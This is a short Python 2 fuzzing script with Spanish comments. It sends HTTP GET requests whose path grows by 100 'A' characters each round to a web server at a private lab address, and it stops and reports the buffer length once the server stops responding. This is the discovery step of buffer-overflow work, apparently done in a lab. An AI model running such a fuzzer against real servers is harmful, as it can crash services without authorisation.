#!/usr/share/python
import socket

#Fuzzear parametro GET
princi_buffer="GET "
buffer =""
fin_buffer=" HTTP/1.1\r\n\r\n"

while True:

    buffer = buffer+('\x41'*100)
    final_buffer = princi_buffer+buffer+fin_buffer

    print "Lanzando buffer de %d caracteres" % len(buffer)
	
    try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("192.168.56.102", 80))

	sock.send(final_buffer)
	sock.recv(1024)
	sock.close()

	print "Peticion enviada a la app: %s" % final_buffer

    except:
	print "El servidor ha reventado con un buffer de %d caracteres" % len(buffer)
	exit()
